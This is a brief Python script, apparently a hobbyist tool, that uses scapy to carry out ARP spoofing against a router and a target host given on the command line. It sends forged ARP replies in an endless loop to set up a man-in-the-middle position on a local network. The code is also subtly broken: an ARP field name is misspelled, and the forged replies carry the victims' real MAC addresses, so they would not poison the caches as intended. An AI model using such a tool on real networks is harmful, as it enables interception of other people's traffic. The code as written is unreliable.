import scapy.all as scapy
import sys
import time


def get_mac_adress(ip_adress):
    # define dst: destination
    broadcast_layer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    # sending request to entire network asking for MAC from ip 
    arp_layer = scapy.ARP(pdts=ip_adress)
    # combine broadcast and arp request
    get_mac_packet = broadcast_layer/arp_layer
    # send and retrieve response
    response = scapy.srp(get_mac_packet, timeout=2,verbose=False)[0]
    return response[0][1].hwsrc

def spoof(router_ip, target_ip, router_mac, target_mac):
    target_to_router_packet = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip, hwsrc=target_mac)
    router_to_target_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip, hwsrc=router_mac)
    scapy.send(target_to_router_packet)
    scapy.send(router_to_target_packet)

target_ip = str(sys.argv[2])
router_ip = str(sys.argv[1])
target_mac = get_mac_adress(target_ip)
router_mac = get_mac_adress(router_ip)

try:
    while True:
        spoof(router_ip, target_ip, router_mac, target_mac)
except KeyboardInterrupt:
    print('Spoofing interrupted by user')
    sys.exit(0)